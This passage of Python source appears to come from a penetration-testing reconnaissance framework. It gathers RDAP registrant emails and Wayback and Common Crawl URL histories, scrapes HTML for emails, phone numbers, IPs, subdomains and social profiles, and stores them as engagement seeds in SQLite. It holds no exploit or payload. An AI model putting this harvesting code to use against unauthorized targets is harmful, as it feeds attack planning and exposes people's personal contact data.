            for row in vcard[1]:
                if len(row) >= 4 and row[0] == "email":
                    e = str(row[3]).lower().strip()
                    if "@" in e and e not in emails:
                        emails.append(e)
        registrar = ""
        for entity in data.get("entities", []):
            roles = entity.get("roles", [])
            if "registrar" in roles:
                vcard = entity.get("vcardArray") or []
                if len(vcard) >= 2:
                    for row in vcard[1]:
                        if len(row) >= 4 and row[0] == "fn":
                            registrar = str(row[3])
                            break
        ns = [n.get("ldhName", "").lower()
              for n in data.get("nameservers", []) if n.get("ldhName")]
        result["registrant_emails"] = emails
        result["registrar"] = registrar
        result["related_nameservers"] = ns
        return result

    def _wayback_urls(domain_name: str, timeout: float = 15.0,
                      limit: int = 500) -> list[str]:
        """Query archive.org CDX API for every URL ever crawled under
        <domain>/*. Returns unique original URLs. Empty on failure.

        Reveals: deprecated endpoints, admin paths, leaked file names,
        parameter names, old subdomains no longer live.

        limit=0 enables pagination — repeatedly requests until CDX
        returns an empty page, capped at 10,000 URLs total for safety.
        """
        from forge.utils.intel.wayback_lookup import search_wayback_urls  # noqa: PLC0415

        return search_wayback_urls(domain_name, timeout=timeout, limit=limit)

    def _commoncrawl_urls(domain_name: str, timeout: float = 15.0) -> list[str]:
        """Query recent Common Crawl indexes for passive historical URLs."""
        from forge.utils.intel.commoncrawl_lookup import search_commoncrawl_urls  # noqa: PLC0415

        return search_commoncrawl_urls(domain_name, timeout=timeout)

    def _dedupe_url_list(values: Iterable[str]) -> list[str]:
        seen: set[str] = set()
        unique: list[str] = []
        for raw_value in values:
            value = str(raw_value or "").strip()
            if not value or value in seen:
                continue
            seen.add(value)
            unique.append(value)
        return unique

    def _archive_url_source_metadata(
        *,
        root_domain: str,
        wayback_urls: Iterable[str],
        commoncrawl_urls: Iterable[str],
    ) -> dict[str, dict[str, Any]]:
        metadata_by_url: dict[str, dict[str, Any]] = {}

        def _append_source(raw_url: str, source_name: str) -> None:
            normalized_url = str(raw_url or "").strip()
            if not normalized_url:
                return
            metadata = metadata_by_url.setdefault(
                normalized_url,
                {
                    "discovered_from": "historical_cdx",
                    "root_domain": str(root_domain or "").strip().lower(),
                    "archive_sources": [],
                    "provider_sources": [],
                },
            )
            for key in ("archive_sources", "provider_sources"):
                sources = metadata.get(key)
                if not isinstance(sources, list):
                    sources = []
                    metadata[key] = sources
                if source_name not in sources:
                    sources.append(source_name)

        for url_value in wayback_urls:
            _append_source(url_value, "wayback")
        for url_value in commoncrawl_urls:
            _append_source(url_value, "commoncrawl")
        return metadata_by_url

    def _extract_html_data(html: str, *, base_url: str = "") -> dict[str, set[str]]:
        """Pull auxiliary intelligence out of rendered HTML/JS content.

        Beyond cloud refs (in _extract_cloud_refs), we also want:
          - Emails from mailto: links + inline text
          - Phones from inline `+E.164-ish` strings plus `tel:` /
            WhatsApp-style contact URLs
          - GitHub org / user names from any github.com/<name>/ URL
          - Subdomain hints from href / src / URL attributes
          - Public profile / repository URLs that can feed recursive
            username, name, or company fan-outs immediately
          - Same-scope crawl / artifact URLs, including relative links,
            so exposed APKs, bundles, and documents can flow directly
            into the artifact queue

        Returns dict with keys: emails, phones, ip_seeds, github_orgs, subdomain_hints,
        public_profile_urls, crawl_urls.
        Each value is a set of unique strings. Caller decides which to
        persist to the DB and which to feed back to the loop.
        """
        from forge.engagement_orchestrator import (  # noqa: PLC0415
            EngagementSynthesisEngine as _EngagementSynthesisEngine,
            _extract_artifact_ip_seeds as _extract_artifact_ip_seeds,
            _normalize_phone_seed_value as _normalize_phone_seed_value,
        )

        emails: set[str] = set()
        phones: set[str] = set()
        ip_seeds: set[str] = set()
        github_orgs: set[str] = set()
        subdomain_hints: set[str] = set()
        public_profile_urls: set[str] = set()
        crawl_urls: set[str] = set()

        # Emails: mailto: and inline
        for m in _re.finditer(r'mailto:([^\s"\'<>?&]+)', html):
            e = m.group(1).lower().strip()
            if "@" in e and "." in e.split("@")[-1]:
                emails.add(e)
        for m in _re.finditer(
            r'[a-zA-Z0-9_.+\-]+@[a-zA-Z0-9\-]+(?:\.[a-zA-Z]{2,})+', html
        ):
            e = m.group(0).lower().strip(".")
            # Filter garbage / example emails
            if not any(bad in e for bad in ("example.", "test@", "@example",
                                             "sentry.io", "wixpress.com",
                                             "@2x.png", "@sha256")):
                if len(e) <= 254 and e.count("@") == 1:
                    emails.add(e)

        for m in _HTML_PHONE_RE.finditer(html):
            normalized_phone = _normalize_phone_seed_value(m.group(1))
            if normalized_phone:
                phones.add(normalized_phone)

        for ip_value, _seed_type in _extract_artifact_ip_seeds(html):
            normalized_ip = str(ip_value or "").strip()
            if normalized_ip:
                ip_seeds.add(normalized_ip)

        for m in _re.finditer(r"tel:[^\s\"'<>`]+", html, _re.IGNORECASE):
            normalized_phone = _EngagementSynthesisEngine._extract_phone_from_contact_url(
                m.group(0)
            )
            if normalized_phone:
                phones.add(normalized_phone)

        for candidate in _extract_html_surface_urls(html, base_url=base_url):
            crawl_urls.add(candidate)
            parsed_candidate = urlparse(candidate)
            host = str(parsed_candidate.hostname or "").strip().lower()
            if host and len(host) > 4 and "." in host:
                subdomain_hints.add(host)
            if host == "github.com":
                path_parts = [part for part in parsed_candidate.path.split("/") if part]
                if path_parts:
                    first_path = path_parts[0].lower()
                    org = ""
                    if first_path == "orgs" and len(path_parts) >= 2:
                        org = path_parts[1].lower()
                    elif first_path not in {"features", "pricing", "topics", "trending",
                                            "collections", "events", "sponsors", "readme",
                                            "orgs", "settings", "explore", "marketplace",
                                            "notifications", "issues", "pulls", "join",
                                            "login", "logout", "search"}:
                        org = first_path
                    if org:
                        github_orgs.add(org)
            normalized_phone = _EngagementSynthesisEngine._extract_phone_from_contact_url(candidate)
            if normalized_phone:
                phones.add(normalized_phone)
            profile_stub = {"profile_url": candidate}
            platform = _EngagementSynthesisEngine._social_profile_platform_hint(profile_stub)
            if not platform:
                continue
            handle = _EngagementSynthesisEngine._extract_social_profile_handle_from_url(candidate)
            company_name = _EngagementSynthesisEngine._social_profile_company_name(
                profile_stub,
                source_label="html_extract",
                platform=platform,
            )
            full_name = _EngagementSynthesisEngine._social_profile_name(profile_stub)
            if handle or company_name or full_name:
                public_profile_urls.add(candidate)

        return {
            "emails": emails,
            "phones": phones,
            "ip_seeds": ip_seeds,
            "github_orgs": github_orgs,
            "subdomain_hints": subdomain_hints,
            "public_profile_urls": public_profile_urls,
            "crawl_urls": crawl_urls,
        }

    def _persist_new_emails(
        new_emails: set[str],
        *,
        max_workers: int = 1,
        progress_label: str | None = None,
        progress_callback: Callable[[str, dict[str, object]], None] | None = None,
    ) -> int:
        """Insert unseen emails into the emails table. Returns count added."""
        if not new_emails:
            return 0
        added = 0
        sorted_emails = sorted(new_emails)
        if progress_label and len(sorted_emails) > 1 and max_workers > 1:
            _log(
                progress_label,
                f"[dim]parallel parse x{min(max_workers, len(sorted_emails))}[/dim]",
            )
        prepared_email_values = _run_inprocess_batch(
            sorted_emails,
            lambda email_value: str(email_value or "").strip() or None,
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
        con = _sq.connect(db_path)
        try:
            try:
                existing_email_rows = con.execute(
                    "SELECT email FROM emails WHERE engagement_id=?",
                    (engagement_id,),
                ).fetchall()
            except _sq.OperationalError:
                existing_email_rows = []
            existing = _collect_normalized_value_set(
                _collect_text_row_values(
                    existing_email_rows,
                    max_workers=max_workers,
                    progress_label=_derive_child_progress_label(
                        progress_label,
                        "existing row prep",
                    ),
                    progress_callback=progress_callback,
                ),
                normalizer=lambda value: str(value or "").strip().lower(),
                max_workers=max_workers,
                progress_label=_derive_child_progress_label(
                    progress_label,
                    "existing set prep",
                ),
                progress_callback=progress_callback,
            )
            reduction_progress_label = _derive_reduction_progress_label(progress_label)
            if reduction_progress_label and len(prepared_email_values) > 1 and max_workers > 1:
                _log(
                    reduction_progress_label,
                    f"[dim]parallel parse x{min(max_workers, len(prepared_email_values))}[/dim]",
                )
            reduced_email_values = _run_inprocess_batch(
                prepared_email_values,
                lambda email_value: _prepare_email_persist_reduction_item(
                    email_value,
                    existing_lower=existing,
                ),
                max_workers=max_workers,
                progress_label=reduction_progress_label,
                progress_callback=progress_callback,
            )
            apply_progress_label = _derive_apply_progress_label(progress_label)
            email_persist_halted = False

            def _apply_email_persist_value(email_value: str | None) -> int:
                nonlocal email_persist_halted
                if email_persist_halted or not email_value or email_value in existing:
                    return 0
                try:
                    con.execute(
                        "INSERT INTO emails (engagement_id, email, source) "
                        "VALUES (?, ?, 'kill_chain_html_extract')",
                        (engagement_id, email_value),
                    )
                    _upsert_engagement_seed(
                        con,
                        email_value,
                        "email",
                        source="discovered",
                        status="pending",
                        depth=1,
                        confidence=0.8,
                    )
                    return 1
                except _sq.OperationalError:
                    email_persist_halted = True
                    return 0
                except _sq.IntegrityError:
                    return 0

            applied_email_values = _run_ordered_inprocess_apply_batch(
                reduced_email_values,
                _apply_email_persist_value,
                progress_label=apply_progress_label,
                progress_callback=progress_callback,
                order_note="email persistence order preserved",
            )
            email_total_out = [0]
            _run_inprocess_batch(
                applied_email_values,
                lambda item: _apply_int_total_item(
                    item,
                    total_out=email_total_out,
                ),
                max_workers=1,
                progress_label=_derive_child_progress_label(progress_label, "total apply"),
                progress_callback=progress_callback,
            )
            added += email_total_out[0]
            con.commit()
        finally:
            con.close()
        return added

    def _persist_new_phone_seeds(
        new_phones: set[str],
        *,
        max_workers: int = 1,
        progress_label: str | None = None,
        progress_callback: Callable[[str, dict[str, object]], None] | None = None,
    ) -> int:
        """Insert unseen phone seeds discovered from live HTML/passive text."""
        if not new_phones:
            return 0
        added = 0
        sorted_phones = sorted(new_phones)
        if progress_label and len(sorted_phones) > 1 and max_workers > 1:
            _log(
                progress_label,
                f"[dim]parallel parse x{min(max_workers, len(sorted_phones))}[/dim]",
            )
        prepared_phone_values = _run_inprocess_batch(
            sorted_phones,
            lambda phone_value: str(phone_value or "").strip() or None,
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
        con = _sq.connect(db_path)
        try:
            try:
                existing_phone_rows = con.execute(
                    """
                    SELECT seed_value
                    FROM engagement_seeds
                    WHERE engagement_id=? AND seed_type='phone'
                    """,
                    (engagement_id,),
                ).fetchall()
            except _sq.OperationalError:
                existing_phone_rows = []
            existing = _collect_normalized_text_row_value_set(
                existing_phone_rows,
                normalizer=lambda value: str(value or "").strip(),
                max_workers=max_workers,
                row_progress_label=_derive_child_progress_label(
                    progress_label,
                    "existing row prep",
                ),
                set_progress_label=_derive_child_progress_label(
                    progress_label,
                    "existing set prep",
                ),
                progress_callback=progress_callback,
            )
            reduction_progress_label = _derive_reduction_progress_label(progress_label)
            if reduction_progress_label and len(prepared_phone_values) > 1 and max_workers > 1:
                _log(
                    reduction_progress_label,
                    f"[dim]parallel parse x{min(max_workers, len(prepared_phone_values))}[/dim]",
                )
            reduced_phone_values = _run_inprocess_batch(
                prepared_phone_values,
                lambda phone_value: _prepare_phone_persist_reduction_item(
                    phone_value,
                    existing=existing,
                ),
                max_workers=max_workers,
                progress_label=reduction_progress_label,
                progress_callback=progress_callback,
            )
            apply_progress_label = _derive_apply_progress_label(progress_label)
            phone_persist_halted = False

            def _apply_phone_persist_value(normalized_phone: str | None) -> int:
                nonlocal phone_persist_halted
                if phone_persist_halted or not normalized_phone or normalized_phone in existing:
                    return 0
                try:
                    _upsert_engagement_seed(
                        con,
                        normalized_phone,
                        "phone",
                        source="discovered",
                        status="pending",
                        depth=1,
                        confidence=0.79,
                    )
                    existing.add(normalized_phone)
                    return 1
                except _sq.OperationalError:
                    phone_persist_halted = True
                    return 0

            applied_phone_values = _run_ordered_inprocess_apply_batch(
                reduced_phone_values,
                _apply_phone_persist_value,
                progress_label=apply_progress_label,
                progress_callback=progress_callback,
                order_note="phone persistence order preserved",
            )
            phone_total_out = [0]
            _run_inprocess_batch(
                applied_phone_values,
                lambda item: _apply_int_total_item(
                    item,
                    total_out=phone_total_out,
                ),
                max_workers=1,
                progress_label=_derive_child_progress_label(progress_label, "total apply"),
                progress_callback=progress_callback,
            )
            added += phone_total_out[0]
            con.commit()
        finally:
            con.close()
        return added

    def _persist_new_ip_seeds(
        new_ips: set[str],
        *,
        max_workers: int = 1,
        progress_label: str | None = None,
        progress_callback: Callable[[str, dict[str, object]], None] | None = None,
    ) -> int:
        """Insert unseen IP seeds discovered from live HTML/passive text."""
        if not new_ips:
            return 0
        added = 0
        sorted_ips = sorted(new_ips)
        if progress_label and len(sorted_ips) > 1 and max_workers > 1:
            _log(
                progress_label,
                f"[dim]parallel parse x{min(max_workers, len(sorted_ips))}[/dim]",
            )
        prepared_ip_values = _run_inprocess_batch(
            sorted_ips,
            lambda ip_value: (
                None
                if _classify_seed(str(ip_value or "").strip()) not in {"ipv4", "ipv6"}
                else (str(ip_value or "").strip(), _classify_seed(str(ip_value or "").strip()))
            ),
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
        con = _sq.connect(db_path)
        try:
            try:
                existing_seed_ip_rows = con.execute(
                    """
                    SELECT seed_value
                    FROM engagement_seeds
                    WHERE engagement_id=? AND seed_type IN ('ipv4', 'ipv6')
                    """,
                    (engagement_id,),
                ).fetchall()
            except _sq.OperationalError:
                existing_seed_ip_rows = []
            existing_seed_ips = _collect_normalized_text_row_value_set(
                existing_seed_ip_rows,
                normalizer=lambda value: str(value or "").strip(),
                max_workers=max_workers,
                row_progress_label=_derive_child_progress_label(
                    progress_label,
                    "existing seed row prep",
                ),
                set_progress_label=_derive_child_progress_label(
                    progress_label,
                    "existing seed set prep",
                ),
                progress_callback=progress_callback,
            )

            try:
                existing_host_ip_rows = con.execute(
                    """
                    SELECT ip
                    FROM hosts
                    WHERE engagement_id=? AND ip IS NOT NULL
                    """,
                    (engagement_id,),
                ).fetchall()
            except _sq.OperationalError:
                existing_host_ip_rows = []
            existing_host_ips = _collect_normalized_text_row_value_set(
                existing_host_ip_rows,
                normalizer=lambda value: str(value or "").strip(),
                max_workers=max_workers,
                row_progress_label=_derive_child_progress_label(
                    progress_label,
                    "existing host row prep",
                ),
                set_progress_label=_derive_child_progress_label(
                    progress_label,
                    "existing host set prep",
                ),
                progress_callback=progress_callback,
            )

            reduction_progress_label = _derive_reduction_progress_label(progress_label)
            if reduction_progress_label and len(prepared_ip_values) > 1 and max_workers > 1:
                _log(
                    reduction_progress_label,
                    f"[dim]parallel parse x{min(max_workers, len(prepared_ip_values))}[/dim]",
                )
            reduced_ip_entries = _run_inprocess_batch(
                prepared_ip_values,
                lambda prepared_ip_value: _prepare_ip_persist_reduction_item(
                    prepared_ip_value,
                    existing_seed_ips=existing_seed_ips,
                    existing_host_ips=existing_host_ips,
                ),
                max_workers=max_workers,
                progress_label=reduction_progress_label,
                progress_callback=progress_callback,
            )
            apply_progress_label = _derive_apply_progress_label(progress_label)
            ip_persist_halted = False

            def _apply_ip_persist_entry(prepared_ip_entry: dict[str, object] | None) -> int:
                nonlocal ip_persist_halted
                if ip_persist_halted or prepared_ip_entry is None:
                    return 0
                normalized_ip = str(prepared_ip_entry["normalized_ip"] or "").strip()
                seed_type = str(prepared_ip_entry["seed_type"] or "").strip()
                should_insert_seed = bool(prepared_ip_entry["insert_seed"])
                should_insert_host = bool(prepared_ip_entry["insert_host"])
                inserted_seed = 0
                if should_insert_seed and normalized_ip not in existing_seed_ips:
                    _upsert_engagement_seed(
                        con,
                        normalized_ip,
                        seed_type,
                        source="discovered",
                        status="pending",
                        depth=1,
                        confidence=0.79,
                    )
                    existing_seed_ips.add(normalized_ip)
                    inserted_seed = 1
                if should_insert_host and normalized_ip not in existing_host_ips:
                    try:
                        con.execute(
                            """
                            INSERT INTO hosts (engagement_id, ip, hostname, os_family, host_context)
                            VALUES (?, ?, ?, 'unknown', ?)
                            """,
                            (
                                engagement_id,
                                normalized_ip,
                                "",
                                _host_context_json("html_ip_extract"),
                            ),
                        )
                        existing_host_ips.add(normalized_ip)
                    except _sq.IntegrityError:
                        pass
                    except _sq.OperationalError:
                        ip_persist_halted = True
                return inserted_seed

            applied_ip_entries = _run_ordered_inprocess_apply_batch(
                reduced_ip_entries,
                _apply_ip_persist_entry,
                progress_label=apply_progress_label,
                progress_callback=progress_callback,
                order_note="IP persistence order preserved",
            )
            ip_total_out = [0]
            _run_inprocess_batch(
                applied_ip_entries,
                lambda item: _apply_int_total_item(
                    item,
                    total_out=ip_total_out,
                ),
                max_workers=1,
                progress_label=_derive_child_progress_label(progress_label, "total apply"),
                progress_callback=progress_callback,
            )
            added += ip_total_out[0]
            con.commit()
        finally:
            con.close()
        return added

    def _persist_discovered_subdomain_seed(
        con: Any,
        hostname: str,
        *,
        discovery: str,
        existing_seed_hosts: set[str],
        existing_hosts: set[str] | None = None,
        confidence: float = 0.75,
        depth: int = 1,
        resolved_ip: str | None = None,
        synthetic_ip: bool | None = None,
    ) -> bool:
        normalized_host = str(hostname or "").strip().lower().strip(".")
        if (
            not normalized_host
            or "." not in normalized_host
            or _excluded_host_for_seed_routing(normalized_host)
        ):
            return False
        is_new_seed = normalized_host not in existing_seed_hosts
        if is_new_seed:
            _upsert_engagement_seed(
                con,
                normalized_host,
                "subdomain",
                source="discovered",
                status="pending",
                depth=depth,
                confidence=confidence,
            )
            existing_seed_hosts.add(normalized_host)
        if existing_hosts is not None and normalized_host in existing_hosts:
            return is_new_seed
        if resolved_ip is None:
            try:
                ip = _socket.gethostbyname(normalized_host)
            except (_socket.gaierror, _socket.herror, OSError):
                ip = "0.0.0.0"
            synthetic_ip = _is_placeholder_host_ip(ip)
        else:
            ip = str(resolved_ip or "").strip() or "0.0.0.0"
            synthetic_ip = (
                _is_placeholder_host_ip(ip)
                if synthetic_ip is None
                else bool(synthetic_ip)
            )
        try:
            con.execute(
                "INSERT INTO hosts (engagement_id, ip, hostname, os_family, host_context) "
                "VALUES (?, ?, ?, 'unknown', ?)",
                (
                    engagement_id,
                    ip,
                    normalized_host,
                    _host_context_json(discovery, synthetic_ip=synthetic_ip),
                ),
            )
            if existing_hosts is not None:
                existing_hosts.add(normalized_host)
        except _sq.IntegrityError:
            pass
        return is_new_seed

    def _prepare_persisted_hostname_hint(hostname: str) -> str | None:
        normalized_host = str(hostname or "").strip().lower().strip(".")
        if not normalized_host:
            return None
        if not any(normalized_host == root or normalized_host.endswith("." + root) for root in root_domains):
            return None
        return normalized_host

    def _persist_new_hostnames(
        hints: set[str],
        *,
        discovery: str = "html_href_extract",
        max_workers: int = 1,
        progress_label: str | None = None,
        progress_callback: Callable[[str, dict[str, object]], None] | None = None,
    ) -> int:
        """Insert hostnames from HTML hints that belong to the target domain
        or its subdomains and aren't already in hosts."""
        if not hints:
            return 0
        sorted_hints = sorted(hints)
        if progress_label and len(sorted_hints) > 1 and max_workers > 1:
            _log(
                progress_label,
                f"[dim]parallel parse x{min(max_workers, len(sorted_hints))}[/dim]",
            )
        prepared_hints = _run_inprocess_batch(
            sorted_hints,
            _prepare_persisted_hostname_hint,
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
        matching: list[str] = []
        seen_matching: set[str] = set()
        _run_ordered_inprocess_apply_batch(
            prepared_hints,
            lambda prepared_hint: _apply_unique_hostname_hint_item(
                prepared_hint,
                matching_out=matching,
                seen_out=seen_matching,
            ),
            progress_label=_derive_merge_progress_label(progress_label),
            progress_callback=progress_callback,
            order_note="hostname hint merge order preserved",
        )
        if not matching:
            return 0
        added = 0
        con = _sq.connect(db_path)
        try:
            existing_host_rows = con.execute(
                "SELECT hostname FROM hosts WHERE engagement_id=? "
                "AND hostname IS NOT NULL",
                (engagement_id,),
            ).fetchall()
            existing = _collect_normalized_text_row_value_set(
                existing_host_rows,
                normalizer=lambda value: str(value or "").strip().lower(),
                max_workers=max_workers,
                row_progress_label=_derive_child_progress_label(
                    progress_label,
                    "existing row prep",
                ),
                set_progress_label=_derive_child_progress_label(
                    progress_label,
                    "existing set prep",
                ),
                progress_callback=progress_callback,
            )
            existing_seed_rows = con.execute(
                """
                SELECT seed_value
                FROM engagement_seeds
                WHERE engagement_id=?
                  AND seed_type='subdomain'
                """,
                (engagement_id,),
            ).fetchall()
            existing_seed_hosts = _collect_normalized_text_row_value_set(
                existing_seed_rows,
                normalizer=lambda value: str(value or "").strip().lower(),
                max_workers=max_workers,
                row_progress_label=_derive_child_progress_label(
                    progress_label,
                    "seed row prep",
                ),
                set_progress_label=_derive_child_progress_label(
                    progress_label,
                    "seed set prep",
                ),
                progress_callback=progress_callback,
            )
            reduction_progress_label = _derive_reduction_progress_label(progress_label)
            if reduction_progress_label and len(matching) > 1 and max_workers > 1:
                _log(
                    reduction_progress_label,
                    f"[dim]parallel parse x{min(max_workers, len(matching))}[/dim]",
                )
            reduced_matching_hosts = _run_inprocess_batch(
                matching,
                lambda hostname: _prepare_hostname_persist_reduction_item(
                    hostname,
                    existing_seed_hosts=existing_seed_hosts,
                    existing_hosts=existing,
                ),
                max_workers=max_workers,
                progress_label=reduction_progress_label,
                progress_callback=progress_callback,
            )
            resolution_progress_label = _derive_resolution_progress_label(progress_label)
            host_resolution_inputs = [
                str(host or "").strip().lower()
                for host in reduced_matching_hosts
                if host and str(host or "").strip().lower() not in existing
            ]
            resolved_host_map: dict[str, dict[str, object]] = {}
            if resolution_progress_label and len(host_resolution_inputs) > 1 and max_workers > 1:
                _log(
                    resolution_progress_label,
                    f"[dim]parallel parse x{min(max_workers, len(host_resolution_inputs))}[/dim]",
                )
            resolved_host_entries = _run_inprocess_batch(
                host_resolution_inputs,
                _prepare_resolved_hostname_item,
                max_workers=max_workers,
                progress_label=resolution_progress_label,
                progress_callback=progress_callback,
            )
            _run_inprocess_batch(
                resolved_host_entries,
                lambda item: _apply_resolved_hostname_map_item(
                    item,
                    resolved_map_out=resolved_host_map,
                ),
                max_workers=1,
                progress_label=(
                    f"{resolution_progress_label} apply"
                    if resolution_progress_label
                    else None
                ),
                progress_callback=progress_callback,
            )
            apply_progress_label = _derive_apply_progress_label(progress_label)

            def _apply_hostname_persist_value(host: str | None) -> int:
                if not host or (host in existing_seed_hosts and host in existing):
                    return 0
                resolved_host = resolved_host_map.get(str(host).lower())
                return int(
                    _persist_discovered_subdomain_seed(
                        con,
                        host,
                        discovery=discovery,
                        existing_seed_hosts=existing_seed_hosts,
                        existing_hosts=existing,
                        resolved_ip=(
                            cast(str | None, resolved_host.get("resolved_ip"))
                            if resolved_host is not None
                            else None
                        ),
                        synthetic_ip=(
                            cast(bool | None, resolved_host.get("synthetic_ip"))
                            if resolved_host is not None
                            else None
                        ),
                    )
                )

            applied_hostname_values = _run_ordered_inprocess_apply_batch(
                reduced_matching_hosts,
                _apply_hostname_persist_value,
                progress_label=apply_progress_label,
                progress_callback=progress_callback,
                order_note="hostname persistence order preserved",
            )
            hostname_total_out = [0]
            _run_inprocess_batch(
                applied_hostname_values,
                lambda item: _apply_int_total_item(
                    item,
                    total_out=hostname_total_out,
                ),
                max_workers=1,
                progress_label=_derive_child_progress_label(progress_label, "total apply"),
                progress_callback=progress_callback,
            )
            added += hostname_total_out[0]
            con.commit()
        finally:
            con.close()
        return added

    def _prepare_discovered_seed_url(
        raw_url: str,
        *,
        require_scope: bool,
    ) -> tuple[str, str] | None:
        normalized_url = str(raw_url or "").strip()
        if not normalized_url:
            return None
        if require_scope:
            parsed = urlparse(normalized_url)
            hostname = str(parsed.hostname or "").strip().lower()
            if not hostname:
                return None
            if not any(hostname == root or hostname.endswith("." + root) for root in root_domains):
                return None
            leaf_name = Path(parsed.path or "").name.lower()
            if leaf_name in {"robots.txt", "sitemap.xml"}:
                return None
        seed_type = _classify_seed(normalized_url)
        if seed_type not in {"url", "apk_url"}:
            return None
        return normalized_url, seed_type

    def _persist_discovered_crawl_urls(
        urls: set[str],
        *,
        discovery: str,
        url_metadata: dict[str, dict[str, Any]] | None = None,
        max_workers: int = 1,
        progress_label: str | None = None,
        progress_callback: Callable[[str, dict[str, object]], None] | None = None,
    ) -> int:
        """Persist in-scope discovered URLs as crawl + seed data."""
        if not urls or not root_domains:
            return 0

        inserted = 0
        sorted_urls = sorted(urls)
        if progress_label and len(sorted_urls) > 1 and max_workers > 1:
            _log(
                progress_label,
                f"[dim]parallel parse x{min(max_workers, len(sorted_urls))}[/dim]",
            )
        prepared_urls = _run_inprocess_batch(
            sorted_urls,
            lambda raw_url: _prepare_discovered_seed_url(raw_url, require_scope=True),
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
        con = _sq.connect(db_path)
        try:
            existing_crawl_urls: set[str] = set()
            try:
                crawl_rows = con.execute(
                    """
                    SELECT COALESCE(final_url, url)
                    FROM crawl_results
                    WHERE engagement_id=?
                    """,
                    (engagement_id,),
                ).fetchall()
            except _sq.OperationalError:
                crawl_rows = []
            existing_crawl_urls = _collect_normalized_text_row_value_set(
                crawl_rows,
                normalizer=lambda value: str(value or "").strip(),
                max_workers=max_workers,
                row_progress_label=_derive_child_progress_label(
                    progress_label,
                    "existing crawl row prep",
                ),
                set_progress_label=_derive_child_progress_label(
                    progress_label,
                    "existing crawl set prep",
                ),
                progress_callback=progress_callback,
            )

            existing_url_seeds: set[str] = set()
            try:
                seed_rows = con.execute(
                    """
                    SELECT seed_value
                    FROM engagement_seeds
                    WHERE engagement_id=?
                      AND seed_type IN ('url', 'apk_url')
                    """,
                    (engagement_id,),
                ).fetchall()
            except _sq.OperationalError:
                seed_rows = []
            existing_url_seeds = _collect_normalized_text_row_value_set(
                seed_rows,
                normalizer=lambda value: str(value or "").strip(),
                max_workers=max_workers,
                row_progress_label=_derive_child_progress_label(
                    progress_label,
                    "existing seed row prep",
                ),
                set_progress_label=_derive_child_progress_label(
                    progress_label,
                    "existing seed set prep",
                ),
                progress_callback=progress_callback,
            )

            reduction_progress_label = _derive_reduction_progress_label(progress_label)
            if reduction_progress_label and len(prepared_urls) > 1 and max_workers > 1:
                _log(
                    reduction_progress_label,
                    f"[dim]parallel parse x{min(max_workers, len(prepared_urls))}[/dim]",
                )
            reduced_crawl_url_entries = _run_inprocess_batch(
                prepared_urls,
                lambda prepared_url: _prepare_crawl_url_persist_reduction_item(
                    prepared_url,
                    existing_crawl_urls=existing_crawl_urls,
                    existing_url_seeds=existing_url_seeds,
                    source_metadata=url_metadata,
                ),
                max_workers=max_workers,
                progress_label=reduction_progress_label,
                progress_callback=progress_callback,
            )
            apply_progress_label = _derive_apply_progress_label(progress_label)
            crawl_url_persist_halted = False

            def _apply_crawl_url_persist_entry(prepared_url_entry: dict[str, object] | None) -> int:
                nonlocal crawl_url_persist_halted
                if crawl_url_persist_halted or prepared_url_entry is None:
                    return 0
                normalized_url = str(prepared_url_entry["normalized_url"] or "").strip()
                seed_type = str(prepared_url_entry["seed_type"] or "").strip()
                should_insert_crawl = bool(prepared_url_entry["insert_crawl"])
                should_insert_seed = bool(prepared_url_entry["insert_seed"])
                source_metadata = cast(dict[str, Any], prepared_url_entry.get("metadata") or {})
                crawl_metadata = {"discovered_from": discovery}
                if source_metadata:
                    crawl_metadata.update(source_metadata)
                inserted_crawl = 0
                if should_insert_crawl and normalized_url not in existing_crawl_urls:
                    try:
                        con.execute(
                            """
                            INSERT INTO crawl_results
                                (engagement_id, url, final_url, title, tech_stack_json)
                            VALUES (?, ?, ?, ?, ?)
                            """,
                            (
                                engagement_id,
                                normalized_url,
                                normalized_url,
                                f"discovered via {crawl_metadata.get('discovered_from') or discovery}",
                                json.dumps(crawl_metadata, sort_keys=True),
                            ),
                        )
                        inserted_crawl = 1
                        existing_crawl_urls.add(normalized_url)
                    except _sq.OperationalError:
                        crawl_url_persist_halted = True
                        return 0
                if should_insert_seed and normalized_url not in existing_url_seeds:
                    _upsert_engagement_seed(
                        con,
                        normalized_url,
                        seed_type,
                        source="discovered",
                        status="pending",
                        depth=1,
                        confidence=0.78 if seed_type == "url" else 0.8,
                        metadata=source_metadata,
                    )
                    existing_url_seeds.add(normalized_url)
                _promote_cloud_asset_seed_refs(con, normalized_url)
                return inserted_crawl

            applied_crawl_url_entries = _run_ordered_inprocess_apply_batch(
                reduced_crawl_url_entries,
                _apply_crawl_url_persist_entry,
                progress_label=apply_progress_label,
                progress_callback=progress_callback,
                order_note="crawl URL persistence order preserved",
            )
            crawl_url_total_out = [0]
            _run_inprocess_batch(
                applied_crawl_url_entries,
                lambda item: _apply_int_total_item(
                    item,
                    total_out=crawl_url_total_out,
                ),
                max_workers=1,
                progress_label=_derive_child_progress_label(progress_label, "total apply"),
                progress_callback=progress_callback,
            )
            inserted += crawl_url_total_out[0]
            con.commit()
        finally:
            con.close()
        return inserted

    def _persist_discovered_public_profile_urls(
        urls: set[str],
        *,
        discovery: str,
        max_workers: int = 1,
        progress_label: str | None = None,
        progress_callback: Callable[[str, dict[str, object]], None] | None = None,
    ) -> int:
        """Persist public profile / repo URLs that should recurse identity seeds."""
        if not urls:
            return 0

        inserted = 0
        sorted_urls = sorted(urls)
        if progress_label and len(sorted_urls) > 1 and max_workers > 1:
            _log(
                progress_label,
                f"[dim]parallel parse x{min(max_workers, len(sorted_urls))}[/dim]",
            )
        prepared_urls = _run_inprocess_batch(
            sorted_urls,
            lambda raw_url: _prepare_discovered_seed_url(raw_url, require_scope=False),
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
        con = _sq.connect(db_path)
        try:
            existing_url_seeds: set[str] = set()
            try:
                seed_rows = con.execute(
                    """
                    SELECT seed_value
                    FROM engagement_seeds
                    WHERE engagement_id=?
                      AND seed_type IN ('url', 'apk_url')
                    """,
                    (engagement_id,),
                ).fetchall()
            except _sq.OperationalError:
                seed_rows = []
            existing_url_seeds = _collect_normalized_text_row_value_set(
                seed_rows,
                normalizer=lambda value: str(value or "").strip(),
                max_workers=max_workers,
